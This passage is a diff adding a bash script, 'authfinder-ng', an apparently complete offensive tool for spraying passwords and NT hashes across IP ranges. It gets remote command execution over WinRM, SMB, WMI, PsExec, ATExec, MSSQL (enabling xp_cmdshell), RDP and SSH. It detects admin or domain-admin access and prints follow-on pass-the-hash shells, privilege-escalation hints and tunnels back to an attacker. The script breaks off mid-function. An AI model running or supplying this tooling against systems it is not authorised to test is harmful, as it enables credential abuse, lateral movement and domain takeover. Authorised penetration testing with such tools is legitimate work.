@@ -1,0 +1,1492 @@
+#!/usr/bin/env bash
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║  authfinder-ng v3.0 — Advanced Multi-Protocol Access Discovery Engine   ║
+# ║  Red Team | Penetration Testing | MSSP Daily Driver                     ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+VERSION="3.0"
+
+# ── Colors ────────────────────────────────────────────────────────────────
+# IMPORTANT: Must use $'...' so bash stores actual ESC bytes, not literal \033
+# This is what makes colors render in echo, printf, cat<<EOF, and heredocs.
+RED=$'\033[0;31m';   GREEN=$'\033[0;32m';  YELLOW=$'\033[1;33m'; BLUE=$'\033[0;34m'
+CYAN=$'\033[0;36m';  MAG=$'\033[0;35m';   ORANGE=$'\033[38;5;208m'; BOLD=$'\033[1m'
+DIM=$'\033[2m';      NC=$'\033[0m';        BRED=$'\033[1;31m';   BGRN=$'\033[1;32m'
+
+OK="${BGRN}[+]${NC}"; FAIL="${BRED}[-]${NC}"; WARN="${YELLOW}[!]${NC}"
+INFO="${BLUE}[*]${NC}"; TIP="${CYAN}[TIP]${NC}"; CMD="${ORANGE}[CMD]${NC}"
+DBG="${DIM}[DBG]${NC}"; AUTH="${YELLOW}[AUTH]${NC}"
+
+# ── RDP binary detection (xfreerdp3 on modern Kali, xfreerdp on older) ───
+if command -v xfreerdp3 &>/dev/null; then
+    XFREERDP_CMD="xfreerdp3"; XFREERDP_CERT="/cert:ignore"
+elif command -v xfreerdp &>/dev/null; then
+    XFREERDP_CMD="xfreerdp";  XFREERDP_CERT="/cert-ignore"
+else
+    XFREERDP_CMD="xfreerdp";  XFREERDP_CERT="/cert:ignore"
+fi
+
+# ── Globals ───────────────────────────────────────────────────────────────
+MAX_THREADS=10
+EXEC_TIMEOUT=20
+WINRM_TIMEOUT=30
+RDP_TIMEOUT=45
+VERBOSE=false
+RUN_ALL=false
+SKIP_PORTSCAN=false
+TOOLS_SPECIFIED=false
+LINUX_MODE=false
+LOCAL_AUTH=false
+SHOW_NEXT_STEPS=true
+REPORT_FILE=""
+DOMAIN=""
+SPRAY_DELAY=0
+LOCKOUT_THRESHOLD=3
+ONLY_CHECK_TOOLS=false
+
+IMPACKET_PREFIX="impacket-"
+NXC_CMD="nxc"
+WINRM_CMD="evil-winrm"
+
+VALID_TOOLS=(winrm smbexec wmi ssh mssql psexec atexec rdp)
+
+TMP_DIR=""
+RESULTS_FILE=""
+AUTH_FILE=""
+FAIL_FILE=""
+LOCK_FILE=""
+
+# ═══════════════════════════════════════════════════════════════════════════
+# THREAD-SAFE I/O
+# ═══════════════════════════════════════════════════════════════════════════
+lprint() {
+    if [[ -n "$LOCK_FILE" && -f "$LOCK_FILE" ]]; then
+        ( flock -x 200; echo -e "$*" ) 200>"$LOCK_FILE"
+    else
+        echo -e "$*"
+    fi
+}
+
+print_ok()   { lprint "${OK} $*"; }
+print_fail() { lprint "${FAIL} $*"; }
+print_warn() { lprint "${WARN} ${YELLOW}$*${NC}"; }
+print_info() { lprint "${INFO} $*"; }
+print_tip()  { lprint "    ${TIP} ${CYAN}$*${NC}"; }
+print_cmd()  { lprint "    ${CMD} ${ORANGE}$*${NC}"; }
+print_dbg()  { $VERBOSE && lprint "${DBG} ${DIM}$*${NC}" || true; }
+print_sep()  { lprint "${DIM}────────────────────────────────────────────────────────────${NC}"; }
+print_auth() { lprint "${AUTH} ${YELLOW}$*${NC}"; }
+
+# ═══════════════════════════════════════════════════════════════════════════
+# BANNER
+# ═══════════════════════════════════════════════════════════════════════════
+banner() {
+    echo -e "${BOLD}${CYAN}"
+    cat << 'BANNER'
+  ╔═══════════════════════════════════════════════════════════════════════════╗
+  ║   ▄▀█ █░█ ▀█▀ █░█ █▀▀ █ █▄░█ █▀▄ █▀▀ █▀█   █▄░█ █▀▀  v3.0            ║
+  ║   █▀█ █▄█ ░█░ █▀█ █▀░ █ █░▀█ █▄▀ ██▄ █▀▄   █░▀█ █▄█                  ║
+  ║                                                                          ║
+  ║   Multi-Protocol Access Discovery & Command Execution Engine             ║
+  ║   WinRM · SMBexec · WMI · PsExec · ATExec · MSSQL · RDP · SSH          ║
+  ╚═══════════════════════════════════════════════════════════════════════════╝
+BANNER
+    echo -e "${NC}"
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+# TOOL MANAGEMENT
+# ═══════════════════════════════════════════════════════════════════════════
+tool_exists() { command -v "$1" &>/dev/null; }
+
+impacket_cmd() {
+    [[ -n "$IMPACKET_PREFIX" ]] && echo "impacket-${1}" || echo "${1}.py"
+}
+
+install_tools() {
+    echo -e "${BOLD}${CYAN}[*] Installing authfinder-ng dependencies...${NC}"
+    if ! tool_exists nxc && ! tool_exists netexec; then
+        echo -e "${INFO} Installing NetExec..."
+        tool_exists pipx && pipx install "git+https://github.com/Pennyw0rth/NetExec" \
+            || pip3 install "git+https://github.com/Pennyw0rth/NetExec"
+    fi
+    if ! tool_exists impacket-psexec && ! tool_exists psexec.py; then
+        echo -e "${INFO} Installing Impacket..."
+        tool_exists pipx && pipx install impacket || pip3 install impacket
+    fi
+    if ! tool_exists evil-winrm; then
+        echo -e "${INFO} Installing evil-winrm..."
+        gem install evil-winrm
+    fi
+    for pkg in smbclient ldap-utils xfreerdp2-x11; do
+        apt-get install -y "$pkg" 2>/dev/null || true
+    done
+    echo -e "${OK} Done. Re-run authfinder-ng."
+    exit 0
+}
+
+verify_tools() {
+    echo -e "${BOLD}${BLUE}── Tool Verification ──────────────────────────────────────────────${NC}"
+    local -a missing=()
+
+    if tool_exists nxc;            then NXC_CMD="nxc";          lprint "${OK} netexec (nxc)     : ${GREEN}OK${NC}"
+    elif tool_exists netexec;      then NXC_CMD="netexec";      lprint "${OK} netexec           : ${GREEN}OK${NC}"
+    elif tool_exists crackmapexec; then NXC_CMD="crackmapexec"; lprint "${WARN} crackmapexec    : ${YELLOW}found (upgrade → netexec)${NC}"
+    else lprint "${FAIL} netexec/nxc       : ${RED}NOT FOUND${NC}"; print_tip "pipx install git+https://github.com/Pennyw0rth/NetExec"; missing+=(nxc); fi
+
+    if tool_exists impacket-psexec;   then IMPACKET_PREFIX="impacket-"; lprint "${OK} impacket          : ${GREEN}OK (impacket- prefix)${NC}"
+    elif tool_exists psexec.py;        then IMPACKET_PREFIX="";          lprint "${OK} impacket          : ${GREEN}OK (.py suffix)${NC}"
+    else lprint "${FAIL} impacket          : ${RED}NOT FOUND${NC}"; print_tip "pipx install impacket"; [[ "$LINUX_MODE" == "false" ]] && missing+=(impacket); fi
+
+    local found_winrm=false
+    if tool_exists evil-winrm; then
+        WINRM_CMD="evil-winrm"; found_winrm=true
+    elif [[ -d /usr/local/rvm/gems ]]; then
+        for d in /usr/local/rvm/gems/*@evil-winrm/wrappers; do
+            [[ -f "$d/evil-winrm" ]] && WINRM_CMD="$d/evil-winrm" && found_winrm=true && break
+        done
+    fi
+    if $found_winrm; then lprint "${OK} evil-winrm        : ${GREEN}OK${NC}"
+    else lprint "${FAIL} evil-winrm        : ${RED}NOT FOUND${NC}"; print_tip "gem install evil-winrm"; [[ "$LINUX_MODE" == "false" ]] && missing+=(evil-winrm); fi
+
+    for opt in smbclient ldapsearch certipy-ad; do
+        if tool_exists "$opt"; then lprint "${OK} ${opt}$(printf '%*s' $((18-${#opt})) '')  : ${GREEN}OK${NC} ${DIM}(optional)${NC}"
+        else                        lprint "   ${DIM}${opt}$(printf '%*s' $((18-${#opt})) '')  : not found (optional)${NC}"; fi
+    done
+    # xfreerdp / xfreerdp3
+    if tool_exists xfreerdp3; then
+        lprint "${OK} xfreerdp3         : ${GREEN}OK${NC} ${DIM}(optional)${NC}"
+        XFREERDP_CMD="xfreerdp3"; XFREERDP_CERT="/cert:ignore"
+    elif tool_exists xfreerdp; then
+        lprint "${OK} xfreerdp          : ${GREEN}OK${NC} ${DIM}(optional)${NC}"
+        XFREERDP_CMD="xfreerdp"; XFREERDP_CERT="/cert-ignore"
+    else
+        lprint "   ${DIM}xfreerdp/xfreerdp3 : not found (optional)${NC}"
+        print_tip "apt install freerdp2-x11  or  apt install freerdp3-x11"
+    fi
+    echo ""
+
+    if [[ " ${missing[*]} " =~ " nxc " ]]; then
+        echo -e "${RED}[!] netexec required. Run: authfinder-ng --install-tools${NC}"; exit 1; fi
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+# HELPERS
+# ═══════════════════════════════════════════════════════════════════════════
+is_nthash() {
+    local c="${1#:}"; c="${c//\'/}"; c="${c// /}"
+    [[ ${#c} -eq 32 ]] && [[ "$c" =~ ^[0-9a-fA-F]+$ ]]
+}
+
+encode_ps()  { echo -n "$1" | iconv -t UTF-16LE 2>/dev/null | base64 -w 0; }
+encode_b64() { echo -n "$1" | base64 -w 0; }
+
+parse_ip_range() {
+    local range="$1"
+    if [[ "$range" == *.txt && -f "$range" ]]; then
+        while IFS= read -r line; do
+            line="${line%%#*}"; line="${line// /}"
+            [[ -z "$line" ]] && continue
+            parse_ip_range "$line"
+        done < "$range"
+        return
+    fi
+    if [[ "$range" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
+        python3 -c "import ipaddress
+for ip in ipaddress.ip_network('$range',strict=False).hosts(): print(ip)" 2>/dev/null
+        return
+    fi
+    IFS='.' read -ra parts <<< "$range"
+    if [[ ${#parts[@]} -ne 4 ]]; then echo "$range"; return; fi
+    expand_octet() {
+        local -a v=()
+        IFS=',' read -ra secs <<< "$1"
+        for s in "${secs[@]}"; do
+            if [[ "$s" =~ ^([0-9]+)-([0-9]+)$ ]]; then
+                for ((i=${BASH_REMATCH[1]}; i<=${BASH_REMATCH[2]}; i++)); do v+=("$i"); done
+            else v+=("$s"); fi
+        done; echo "${v[@]}"
+    }
+    read -ra A < <(expand_octet "${parts[0]}")
+    read -ra B < <(expand_octet "${parts[1]}")
+    read -ra C < <(expand_octet "${parts[2]}")
+    read -ra D < <(expand_octet "${parts[3]}")
+    for a in "${A[@]}"; do for b in "${B[@]}"; do
+        for c in "${C[@]}"; do for d in "${D[@]}"; do
+            echo "$a.$b.$c.$d"
+        done; done
+    done; done
+}
+
+load_creds_file() {
+    local path="$1"
+    local -a lines=()
+    while IFS= read -r line; do
+        line="${line%%$'\r'}"; local s="${line// /}"
+        [[ -z "$s" || "$s" == \#* ]] && continue
+        lines+=("$line")
+    done < "$path"
+    if (( ${#lines[@]} % 2 != 0 )); then
+        echo -e "${RED}[!] Odd line count in cred file. Need user/cred pairs.${NC}" >&2; exit 1; fi
+    for ((i=0; i<${#lines[@]}; i+=2)); do
+        local user="${lines[$i]// /}" cred="${lines[$((i+1))]}" flag=0
+        is_nthash "$cred" && flag=1
+        echo "${user}|${cred}|${flag}"
+    done
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+# PORT SCANNING
+# ═══════════════════════════════════════════════════════════════════════════
+check_port() { timeout 1 bash -c ">/dev/tcp/${1}/${2}" 2>/dev/null; }
+
+scan_ports_for_ip() {
+    local ip="$1"; shift
+    local -a tlist=("$@")
+    [[ ${#tlist[@]} -eq 0 ]] && tlist=("${VALID_TOOLS[@]}")
+    local -a viable=()
+    local ports_file="${TMP_DIR}/ports_${ip//./_}.txt"
+    touch "$ports_file"
+
+    add_viable() {
+        local t="$1" port="$2"
+        if check_port "$ip" "$port"; then
+            viable+=("$t")
+            grep -qx "$port" "$ports_file" 2>/dev/null || echo "$port" >> "$ports_file"
+        fi
+    }
+
+    for tool in "${tlist[@]}"; do
+        case "$tool" in
+            winrm)                 add_viable winrm     5985; add_viable winrm-ssl 5986 ;;
+            psexec|smbexec|atexec) add_viable "$tool"   445  ;;
+            wmi)                   add_viable wmi        135  ;;
+            rdp)                   add_viable rdp        3389 ;;
+            mssql)                 add_viable mssql      1433 ;;
+            ssh)                   add_viable ssh        22   ;;
+        esac
+    done
+
+    # Always probe RDP silently for next_steps awareness
+    if ! grep -qx "3389" "$ports_file" 2>/dev/null; then
+        check_port "$ip" 3389 && echo "3389" >> "$ports_file"
+    fi
+
+    printf '%s\n' "${viable[@]}"
+}
+
+ip_has_port() {
+    local ip="$1" port="$2"
+    grep -qx "$port" "${TMP_DIR}/ports_${ip//./_}.txt" 2>/dev/null
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+# COMMAND BUILDING — execution commands
+# ═══════════════════════════════════════════════════════════════════════════
+build_cmd() {
+    local tool="$1" user="$2" ip="$3" cred="$4" use_hash="$5" command="$6" domain="${7:-}"
+    local b64ps; b64ps=$(encode_ps "$command")
+    local b64sh; b64sh=$(encode_b64 "$command")
+    local hash_val="${cred#:}"; hash_val="${hash_val//\'/}"
+    local dom_prefix="" nxc_dom=""
+    [[ -n "$domain" ]] && { dom_prefix="${domain}/"; nxc_dom=" -d '${domain}'"; }
+    [[ "$LOCAL_AUTH" == "true" ]] && nxc_dom=" --local-auth"
+
+    case "$tool" in
+        psexec)
+            local ic; ic=$(impacket_cmd psexec)
+            [[ "$use_hash" == "1" ]] \
+                && echo "${ic} -hashes :${hash_val} '${dom_prefix}${user}'@${ip} 'powershell -enc ${b64ps}'" \
+                || echo "${ic} '${dom_prefix}${user}':'${cred}'@${ip} 'powershell -enc ${b64ps}'" ;;
+        mssql)
+            local ic; ic=$(impacket_cmd mssqlclient)
+            [[ "$use_hash" == "1" ]] \
+                && echo "${ic} -hashes :${hash_val} '${dom_prefix}${user}'@${ip} -windows-auth -command 'enable_xp_cmdshell' -command 'xp_cmdshell powershell -enc ${b64ps}'" \
+                || echo "${ic} '${dom_prefix}${user}':'${cred}'@${ip} -windows-auth -command 'enable_xp_cmdshell' -command 'xp_cmdshell powershell -enc ${b64ps}'" ;;
+        atexec)
+            local ic; ic=$(impacket_cmd atexec)
+            [[ "$use_hash" == "1" ]] \
+                && echo "${ic} -hashes :${hash_val} '${dom_prefix}${user}'@${ip} 'powershell -enc ${b64ps}'" \
+                || echo "${ic} '${dom_prefix}${user}':'${cred}'@${ip} 'powershell -enc ${b64ps}'" ;;
+        winrm)
+            local df=""; [[ -n "$domain" ]] && df="-r '${domain}'"
+            [[ "$use_hash" == "1" ]] \
+                && echo "echo 'powershell -enc ${b64ps}' | ${WINRM_CMD} -i ${ip} -u '${user}' -H ${hash_val} ${df}" \
+                || echo "echo 'powershell -enc ${b64ps}' | ${WINRM_CMD} -i ${ip} -u '${user}' -p '${cred}' ${df}" ;;
+        winrm-ssl)
+            local df=""; [[ -n "$domain" ]] && df="-r '${domain}'"
+            [[ "$use_hash" == "1" ]] \
+                && echo "echo 'powershell -enc ${b64ps}' | ${WINRM_CMD} -i ${ip} -u '${user}' -H ${hash_val} --ssl ${df}" \
+                || echo "echo 'powershell -enc ${b64ps}' | ${WINRM_CMD} -i ${ip} -u '${user}' -p '${cred}' --ssl ${df}" ;;
+        smbexec)
+            [[ "$use_hash" == "1" ]] \
+                && echo "${NXC_CMD} smb ${ip} -H ${hash_val} -u '${user}'${nxc_dom} -X 'powershell -enc ${b64ps}' --exec-method smbexec" \
+                || echo "${NXC_CMD} smb ${ip} -p '${cred}' -u '${user}'${nxc_dom} -X 'powershell -enc ${b64ps}' --exec-method smbexec" ;;
+        wmi)
+            [[ "$use_hash" == "1" ]] \
+                && echo "${NXC_CMD} wmi ${ip} -H ${hash_val} -u '${user}'${nxc_dom} -X 'cmd /c \"powershell -enc ${b64ps}\"'" \
+                || echo "${NXC_CMD} wmi ${ip} -p '${cred}' -u '${user}'${nxc_dom} -X 'cmd /c \"powershell -enc ${b64ps}\"'" ;;
+        ssh)
+            [[ "$use_hash" == "1" ]] && { echo ""; return 1; }
+            if [[ "$LINUX_MODE" == "true" ]]; then
+                echo "${NXC_CMD} ssh ${ip} -p '${cred}' -u '${user}' -x 'echo ${b64sh} | base64 -d | \$0'"
+            else
+                echo "${NXC_CMD} ssh ${ip} -p '${cred}' -u '${user}' -x 'powershell -enc ${b64ps}'"
+            fi ;;
+        rdp)
+            # Use screenshot mode to verify auth (exec via -X is unreliable)
+            [[ "$use_hash" == "1" ]] \
+                && echo "${NXC_CMD} rdp ${ip} -u '${user}' -H ${hash_val}${nxc_dom} --screenshot --screentime 3" \
+                || echo "${NXC_CMD} rdp ${ip} -u '${user}' -p '${cred}'${nxc_dom} --screenshot --screentime 3" ;;
+        *) echo ""; return 1 ;;
+    esac
+}
+
+# Clean interactive shell command for summary/next_steps
+build_shell_cmd() {
+    local tool="$1" user="$2" ip="$3" cred="$4" use_hash="$5" domain="${6:-}"
+    local hash_val="${cred#:}"; hash_val="${hash_val//\'/}"
+    local dom_prefix="" nxc_dom=""
+    [[ -n "$domain" ]] && { dom_prefix="${domain}\\"; nxc_dom=" -d '${domain}'"; }
+    [[ "$LOCAL_AUTH" == "true" ]] && nxc_dom=" --local-auth"
+
+    case "$tool" in
+        winrm|winrm-ssl)
+            local ssl=""; [[ "$tool" == "winrm-ssl" ]] && ssl=" --ssl"
+            local df=""; [[ -n "$domain" ]] && df=" -r '${domain}'"
+            [[ "$use_hash" == "1" ]] \
+                && echo "${WINRM_CMD} -i ${ip} -u '${user}' -H ${hash_val}${ssl}${df}" \
+                || echo "${WINRM_CMD} -i ${ip} -u '${user}' -p '${cred}'${ssl}${df}" ;;
+        psexec|smbexec|wmi|atexec)
+            local wex; wex=$(impacket_cmd wmiexec)
+            [[ "$use_hash" == "1" ]] \
+                && echo "${wex} -hashes :${hash_val} '${dom_prefix}${user}'@${ip}" \
+                || echo "${wex} '${dom_prefix}${user}':'${cred}'@${ip}" ;;
+        rdp)
+            [[ "$use_hash" == "1" ]] \
+                && echo "${XFREERDP_CMD} /v:${ip} /u:'${user}' /pth:${hash_val} ${XFREERDP_CERT} /dynamic-resolution +clipboard" \
+                || echo "${XFREERDP_CMD} /v:${ip} /u:'${user}' /p:'${cred}' ${XFREERDP_CERT} /dynamic-resolution +clipboard" ;;
+        mssql)
+            local msc; msc=$(impacket_cmd mssqlclient)
+            [[ "$use_hash" == "1" ]] \
+                && echo "${msc} -hashes :${hash_val} '${dom_prefix}${user}'@${ip} -windows-auth" \
+                || echo "${msc} '${dom_prefix}${user}':'${cred}'@${ip} -windows-auth" ;;
+        ssh) echo "ssh '${user}'@${ip}" ;;
+        *) echo "" ;;
+    esac
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+# OUTPUT INTELLIGENCE — parse whoami/nxc output for privilege context
+# ═══════════════════════════════════════════════════════════════════════════
+analyze_output() {
+    local out="$1" ip="$2" user="$3"
+    local ctx_file="${TMP_DIR}/ctx_${ip//./_}_${user}.txt"
+    local is_admin=false is_da=false is_system=false
+    local -a privs=()
+    local dom_name=""
+
+    # Admin detection
+    echo "$out" | grep -qi "Pwn3d!"                          && is_admin=true
+    echo "$out" | grep -qi "BUILTIN\\\\Administrators"        && is_admin=true
+    echo "$out" | grep -qi "S-1-5-32-544"                    && is_admin=true
+    echo "$out" | grep -qi "High Mandatory Level"             && is_admin=true
+    echo "$out" | grep -qi "NT AUTHORITY.SYSTEM"              && { is_admin=true; is_system=true; }
+
+    # Domain Admin
+    echo "$out" | grep -qi "Domain Admins\|Enterprise Admins\|Schema Admins" && is_da=true
+
+    # Domain name
+    dom_name=$(echo "$out" | grep -oi 'domain:[A-Za-z0-9._-]*' | head -1 | cut -d: -f2)
+
+    # Dangerous privileges
+    local priv_checks=(
+        "SeImpersonatePrivilege:Token Impersonation → GodPotato/PrintSpoofer/SweetPotato"
+        "SeDebugPrivilege:Debug Processes → LSASS dump / process injection"
+        "SeBackupPrivilege:Read ANY file → NTDS.dit extraction"
+        "SeRestorePrivilege:Write ANY file → DLL injection / service abuse"
+        "SeTakeOwnershipPrivilege:Own any object → protected file/registry abuse"
+        "SeLoadDriverPrivilege:Load kernel driver → EoPLoadDriver / Capcom exploit"
+        "SeCreateTokenPrivilege:Create SYSTEM token → full privilege escalation"
+        "SeAssignPrimaryTokenPrivilege:Assign process tokens → impersonation"
+        "SeTcbPrivilege:Act as OS → complete impersonation"
+        "SeEnableDelegationPrivilege:Enable delegation → Kerberos attack surface"
+        "SeManageVolumePrivilege:Volume-level access → shadow copy NTDS.dit"
+    )
+
+    for entry in "${priv_checks[@]}"; do
+        local priv="${entry%%:*}"
+        echo "$out" | grep -qi "$priv" && privs+=("$entry")
+    done
+
+    # Persist context
+    {
+        echo "IS_ADMIN=${is_admin}"
+        echo "IS_DA=${is_da}"
+        echo "IS_SYSTEM=${is_system}"
+        echo "DOMAIN=${dom_name}"
+        printf 'PRIVS=%s\n' "${privs[*]}"
+    } > "$ctx_file"
+
+    # Inline privilege highlights in output stream
+    if [[ ${#privs[@]} -gt 0 ]]; then
+        lprint ""
+        lprint "  ${BOLD}${YELLOW}⚡ DANGEROUS PRIVILEGES DETECTED:${NC}"
+        for entry in "${privs[@]}"; do
+            local priv="${entry%%:*}" desc="${entry#*:}"
+            lprint "    ${BRED}▸ ${priv}${NC} ${DIM}→ ${desc}${NC}"
+        done
+    fi
+
+    $is_admin  && lprint "  ${BGRN}${BOLD}★ LOCAL ADMIN CONFIRMED${NC}"
+    $is_da     && lprint "  ${BRED}${BOLD}★★ DOMAIN ADMIN CONFIRMED — DOMAIN COMPROMISED ★★${NC}"
+    $is_system && lprint "  ${BRED}${BOLD}★★ NT AUTHORITY\\SYSTEM${NC}"
+}
+
+get_ctx() {
+    local ip="$1" user="$2" key="$3"
+    local ctx_file="${TMP_DIR}/ctx_${ip//./_}_${user}.txt"
+    [[ -f "$ctx_file" ]] && grep "^${key}=" "$ctx_file" | cut -d= -f2- || echo ""
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+# ERROR ADVISOR
+# ═══════════════════════════════════════════════════════════════════════════
+analyze_error() {
+    local tool="$1" out="$2" ip="$3" user="$4" cred="$5" use_hash="$6"
+
+    echo "$out" | grep -qi "STATUS_LOGON_FAILURE\|Logon failure\|wrong password\|invalid credentials" && {
+        lprint "    ${WARN} ${YELLOW}Wrong credentials for '${user}' on ${ip}${NC}"
+        [[ "$use_hash" == "1" ]] && print_tip "Verify hash is 32 hex chars (NT only, no LM prefix)"
+        print_tip "Enumerate accounts: ${NXC_CMD} smb ${ip} -u '' -p '' --users 2>/dev/null"
+        return; }
+
+    echo "$out" | grep -qi "ACCOUNT_LOCKED_OUT\|account locked" && {
+        lprint "    ${FAIL} ${RED}LOCKOUT: '${user}' is LOCKED on ${ip} — STOP spraying!${NC}"
+        return; }
+
+    echo "$out" | grep -qi "ACCOUNT_DISABLED" && {
+        lprint "    ${WARN} ${YELLOW}Account DISABLED: '${user}' on ${ip}${NC}"
+        return; }
+
+    echo "$out" | grep -qi "PASSWORD_EXPIRED\|PASSWORD_MUST_CHANGE" && {
+        lprint "    ${WARN} ${YELLOW}Password EXPIRED for '${user}' — must change on first logon${NC}"
+        print_tip "Connect interactively to trigger password change:"
+        print_cmd "${WINRM_CMD} -i ${ip} -u '${user}' -p '${cred}'"
+        return; }
+
+    echo "$out" | grep -qi "STATUS_ACCESS_DENIED\|access denied" && {
+        lprint "    ${WARN} ${YELLOW}Creds VALID but not local admin on ${ip}${NC}"
+        [[ "$LOCAL_AUTH" == "false" ]] && print_tip "Try --local-auth if this is a local account"
+        print_tip "Verify: ${NXC_CMD} smb ${ip} -u '${user}' -p '${cred}' 2>&1 | grep -E 'Pwn3d|\\+'"
+        return; }
+
+    echo "$out" | grep -qi "STATUS_LOGON_TYPE_NOT_GRANTED" && {
+        lprint "    ${WARN} ${YELLOW}Logon type denied for ${tool} — try different protocol${NC}"
+        print_tip "--tools wmi  or  --tools atexec"
+        return; }
+
+    echo "$out" | grep -qi "Clock skew\|KRB_AP_ERR_SKEW" && {
+        lprint "    ${WARN} ${YELLOW}Kerberos clock skew — sync time:${NC}"
+        print_cmd "sudo ntpdate ${ip} && sudo hwclock -w"
+        return; }
+
+    echo "$out" | grep -qi "KDC_ERR_C_PRINCIPAL_UNKNOWN" && {
+        lprint "    ${FAIL} ${RED}Kerberos: user '${user}' not found — check username and -d DOMAIN${NC}"
+        return; }
+
+    echo "$out" | grep -qi "KDC_ERR_PREAUTH_FAILED" && {
+        lprint "    ${FAIL} ${RED}Kerberos pre-auth failed — wrong password${NC}"
+        return; }
+
+    if [[ "$tool" =~ ^winrm ]]; then
+        echo "$out" | grep -qi "WinRMAuthorizationError\|Unauthorized\|401" && {
+            lprint "    ${WARN} ${YELLOW}WinRM: service up but auth rejected${NC}"
+            print_tip "Try adding domain: -d DOMAIN"
+            print_tip "Check WinRM membership: user must be in 'Remote Management Users' or Administrators"
+            return; }
+    fi
+
+    echo "$out" | grep -qi "rpc_s_access_denied" && {
+        lprint "    ${WARN} ${YELLOW}RPC access denied — creds valid but not local admin${NC}"
+        return; }
+
+    echo "$out" | grep -qi "signing.*required\|SMB.*signing" && {
+        lprint "    ${WARN} ${YELLOW}SMB signing required on ${ip}${NC}"
+        print_cmd "${NXC_CMD} smb ${ip} --gen-relay-list relay_targets.txt  ${DIM}# find non-signing targets${NC}"
+        return; }
+
+    [[ "$tool" == "mssql" ]] && echo "$out" | grep -qi "EXECUTE permission.*denied" && {
+        lprint "    ${WARN} ${YELLOW}MSSQL auth OK but xp_cmdshell denied — need sysadmin role${NC}"
+        print_cmd "$(impacket_cmd mssqlclient) ... -windows-auth  ${DIM}# check IS_SRVROLEMEMBER('sysadmin')${NC}"
+        return; }
+}
+
+# ═══════════════════════════════════════════════════════════════════════════
+# CONTEXT-AWARE NEXT STEPS
+# ═══════════════════════════════════════════════════════════════════════════
+next_steps() {
+    local tool="$1" ip="$2" user="$3" cred="$4" use_hash="$5" domain="${6:-}"
+    local hash_val="${cred#:}"; hash_val="${hash_val//\'/}"
+    local dom_prefix="" nxc_dom=""
+    [[ -n "$domain" ]] && { dom_prefix="${domain}\\"; nxc_dom=" -d '${domain}'"; }
+    [[ "$LOCAL_AUTH" == "true" ]] && nxc_dom=" --local-auth"
+
+    local auth_p auth_h
+    if [[ "$use_hash" == "1" ]]; then
+        auth_p="-hashes :${hash_val} '${dom_prefix}${user}'@${ip}"
+        auth_h="-u '${user}' -H ${hash_val}${nxc_dom}"
+    else
+        auth_p="'${dom_prefix}${user}':'${cred}'@${ip}"
+        auth_h="-u '${user}' -p '${cred}'${nxc_dom}"
+    fi
+
+    local is_admin; is_admin=$(get_ctx "$ip" "$user" "IS_ADMIN")
+    local is_da;    is_da=$(get_ctx "$ip" "$user" "IS_DA")
+    local is_system;is_system=$(get_ctx "$ip" "$user" "IS_SYSTEM")
+    local privs;    privs=$(get_ctx "$ip" "$user" "PRIVS")
+    local det_dom;  det_dom=$(get_ctx "$ip" "$user" "DOMAIN")
+    [[ -z "$domain" && -n "$det_dom" ]] && domain="$det_dom"
+    local rdp_open=false; ip_has_port "$ip" 3389 && rdp_open=true
+
+    lprint ""
+    lprint "${BOLD}${CYAN}╔══ NEXT STEPS ════════════════════════════════════════════════════╗${NC}"
+
+    # ── [1] Interactive Shell ──────────────────────────────────────────────
+    lprint "${BOLD}  [1] Interactive Shell${NC}"
+    case "$tool" in
+        winrm|winrm-ssl)
+            local ssl=""; [[ "$tool" == "winrm-ssl" ]] && ssl=" --ssl"
+            local df=""; [[ -n "$domain" ]] && df=" -r '${domain}'"
+            [[ "$use_hash" == "1" ]] \
+                && print_cmd "${WINRM_CMD} -i ${ip} -u '${user}' -H ${hash_val}${ssl}${df}" \
+                || print_cmd "${WINRM_CMD} -i ${ip} -u '${user}' -p '${cred}'${ssl}${df}" ;;
+        psexec|smbexec|atexec)
+            local wex sex dex; wex=$(impacket_cmd wmiexec); sex=$(impacket_cmd smbexec); dex=$(impacket_cmd dcomexec)
+            print_cmd "${wex} ${auth_p}                ${DIM}# WMIexec (semi-interactive)${NC}"
+            print_cmd "${sex} ${auth_p}                ${DIM}# SMBexec (stealth, less detected)${NC}"
+            print_cmd "${dex} ${auth_p} 'cmd.exe'      ${DIM}# DCOM lateral movement${NC}" ;;
+        wmi)
+            # nxc wmi succeeded — but impacket-wmiexec REQUIRES local admin (rpc_s_access_denied otherwise)
+            if [[ "$is_admin" == "true" ]]; then
+                local wex sex dex; wex=$(impacket_cmd wmiexec); sex=$(impacket_cmd smbexec); dex=$(impacket_cmd dcomexec)
+                print_cmd "${wex} ${auth_p}            ${DIM}# interactive WMI shell${NC}"
+                print_cmd "${sex} ${auth_p}            ${DIM}# SMBexec alternative (stealthier)${NC}"
+                print_cmd "${dex} ${auth_p} 'cmd.exe'  ${DIM}# DCOM${NC}"
+            else
+                lprint "    ${YELLOW}[!] impacket-wmiexec needs local admin — not available for this user${NC}"
+                lprint "    ${DIM}# Use nxc wmi for non-interactive remote commands:${NC}"
+                print_cmd "${NXC_CMD} wmi ${ip} ${auth_h} -X 'whoami /all'"
+                print_cmd "${NXC_CMD} wmi ${ip} ${auth_h} -X 'net user ${user} /domain'"
+                print_cmd "${NXC_CMD} wmi ${ip} ${auth_h} -X 'net localgroup Administrators'"
+                lprint "    ${DIM}# Try evil-winrm if WinRM port 5985/5986 is open:${NC}"
+                if [[ "$use_hash" == "1" ]]; then
+                    print_cmd "${WINRM_CMD} -i ${ip} -u '${user}' -H ${hash_val}"
+                else
+                    print_cmd "${WINRM_CMD} -i ${ip} -u '${user}' -p '${cred}'"
+                fi
+            fi ;;
+        mssql)
+            print_cmd "$(impacket_cmd mssqlclient) ${auth_p} -windows-auth" ;;
+        ssh)
+            print_cmd "ssh '${user}'@${ip}"
+            print_cmd "ssh -D 1080 -N '${user}'@${ip}           ${DIM}# SOCKS5 dynamic proxy${NC}"
+            print_cmd "ssh -L 8080:127.0.0.1:80 '${user}'@${ip} ${DIM}# local port forward${NC}"
+            print_cmd "ssh -R 2222:127.0.0.1:22 '${user}'@${ip} ${DIM}# reverse tunnel to attacker${NC}" ;;
+        rdp)
